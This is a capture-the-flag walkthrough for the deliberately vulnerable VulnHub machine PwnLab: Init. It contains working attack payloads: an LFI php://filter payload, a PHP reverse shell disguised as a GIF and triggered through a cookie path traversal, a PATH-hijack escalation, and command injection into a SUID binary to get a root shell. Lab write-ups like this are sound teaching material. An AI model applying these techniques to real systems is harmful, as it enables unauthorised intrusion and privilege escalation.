# PwnLab: Init Walkthrough | vulnhub
## Overview

This walkthrough details the exploitation process of the PwnLab: Init vulnerable machine from VulnHub. The machine involves multiple vulnerabilities including LFI, insecure file uploads, and privilege escalation misconfigurations.
Reconnaissance
Nmap Scan
```
nmap <ip>
```
Discovered open ports with port 80 being particularly interesting.
Web Enumeration
### LFI Vulnerability

Found ` /config.php ` directory through directory enumeration.

Exploited Local File Inclusion (LFI) using PHP wrappers:
text
```
http://site/?page=php://filter/convert.base64-encode/resource=config
```
Retrieved base64-encoded credentials from the configuration file.
Database Access
MySQL Connection Attempt
```
mysql -h <ip> -u root -p
```
`
Received SSL error: ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
Bypassing SSL Requirement`
```
mysql -h 192.168.1.46 -u root -p --skip-ssl
```
Extracting User Credentials
sql
```
MySQL [Users]> select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | **************== |
| mike | **************== |
| kane | **************== |
+------+------------------+
```

### Web Application Access

Logged into the web application using discovered credentials.
File Upload Bypass

Uploaded PHP reverse shell disguised as GIF:
```
Filename: phpreverseshell.php.gif
```
And add gif header
```
GIF89a;
```
LFI

Used LFI to read index.php source code:
text
```
http://site/?page=php://filter/convert.base64-encode/resource=index
```
Discovered `include()` function vulnerability allowing file inclusion and execution.
Reverse Shell
Setup Listener
```
nc -nlvp <listening_port>
```
Trigger Reverse Shell

Modified cookie to execute uploaded file:
text
```
lang=../upload/imagefile.gif
```
Successfully obtained reverse shell connection.
Privilege Escalation
### User Enumeration

Switched to user kent: su kent (limited access)

Attempted to switch to user mike: Permission denied

Successfully switched to user kane: su kane

Found Interesting File

Discovered executable `msgmike` in kane's directory.
`PATH` Manipulation

Created malicious cat executable in /tmp:

```
cd /tmp
echo /bin/bash > cat
chmod 777 cat
export PATH=/tmp:$PATH
cd
./msgmike
```
Successfully escalated to user mike.
Root Escalation

Found another executable msg2root in mike's directory.

Exploited command injection:

```
./msg2root
# When prompted for input:
hi ; /bin/sh
```
### Successfully obtained root shell.
Key Vulnerabilities Exploited

Local File Inclusion (LFI) with PHP wrappers

Insecure file upload with extension bypass

MySQL authentication without SSL requirement

Weak credential storage (base64 encoding)

    PATH environment variable manipulation

    Command injection in SUID binary
